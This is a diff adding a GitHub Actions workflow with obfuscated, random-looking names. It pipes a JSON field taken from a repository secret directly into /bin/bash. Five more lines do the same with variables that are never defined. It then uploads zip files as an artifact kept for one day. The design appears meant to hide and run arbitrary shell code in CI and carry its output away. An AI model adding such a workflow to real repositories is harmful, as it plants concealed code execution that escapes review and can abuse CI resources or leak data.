@@ -1,0 +1,26 @@
+name: jonahsienna7156
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: jonahsienna7156
+        env:
+          cta504: ${{ secrets.cta504 }}
+        run: |
+          printf '%s' "$cta504" | jq -r .or1 | /bin/bash
+          printf '%s' "$fh24048" | jq -r .vuqrp61512 | /bin/bash
+          printf '%s' "$ymls61875" | jq -r .ri83 | /bin/bash
+          printf '%s' "$etry3335" | jq -r .ons334 | /bin/bash
+          printf '%s' "$jobur119" | jq -r .o2174 | /bin/bash
+          printf '%s' "$s44659" | jq -r .mqkcp466 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: Wd92YCTR
+          path: "*.zip"
+          retention-days: 1
